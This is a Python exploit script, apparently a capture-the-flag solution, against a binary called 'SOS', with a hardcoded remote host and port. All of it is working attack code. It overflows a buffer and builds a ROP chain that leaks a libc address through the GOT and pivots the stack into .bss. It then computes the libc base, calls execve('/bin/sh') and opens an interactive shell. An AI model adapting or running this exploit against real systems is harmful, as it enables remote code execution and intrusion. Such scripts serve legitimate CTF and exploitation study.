#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './SOS'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'39.96.8.50', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_stack          = addr_bss + 0xe00
addr_read_noend     = 0x400aa6

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    conn.sendlineafter('size: \n', '1')

    rop = ROP(binf)
    rop.puts(addr_got_main)
    rop.call(addr_read_noend, [addr_stack])
    rop.migrate(addr_stack)

    exploit  = 'a'*0x38
    exploit += str(rop)
    conn.sendafter('code: \n', exploit)

    while True:
        conn.send(p64(rop.ret.address)*0x40)
        if conn.can_recv(0.5):
            break

    addr_libc_main = u(conn.recvuntil('\n', drop=True))
    libc.address = addr_libc_main - offset_libc_main
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    rop = ROP(libc)
    rop.execve(addr_libc_str_sh, 0, 0)
    conn.send(str(rop))

    conn.send('X'*0x100+'\n')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
